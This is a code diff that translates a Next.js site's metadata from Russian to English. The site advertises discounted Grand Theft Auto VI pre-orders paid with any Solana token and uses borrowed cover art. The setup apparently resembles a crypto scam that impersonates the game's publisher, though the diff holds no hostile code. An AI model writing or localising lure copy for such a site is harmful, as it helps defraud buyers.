@@ -3,17 +3,17 @@ import "./globals.css";
 import ClientProviders from "@/components/ClientProviders";
 
 export const metadata: Metadata = {
-  title: "GTA VI × Solana — Предзаказ со скидкой 25%",
+  title: "GTA VI × Solana — Pre-order with 25% Discount",
   description:
-    "Предзакажи Grand Theft Auto VI с эксклюзивной скидкой 25% при оплате в сети Solana. Выход 19 ноября 2026.",
+    "Pre-order Grand Theft Auto VI with an exclusive 25% discount when paying on the Solana network. Release date: November 19, 2026.",
   icons: {
     icon: "/icons.jpg",
     apple: "/icons.jpg",
     shortcut: "/icons.jpg",
   },
   openGraph: {
-    title: "GTA VI × Solana — Предзаказ",
-    description: "Скидка 25% при оплате любым токеном Solana",
+    title: "GTA VI × Solana — Pre-order",
+    description: "25% discount when paying with any Solana token. Release date: November 19, 2026.",
     images: ["https://upload.wikimedia.org/wikipedia/en/5/54/GTA_VI_cover_art.jpg"],
   },
 };
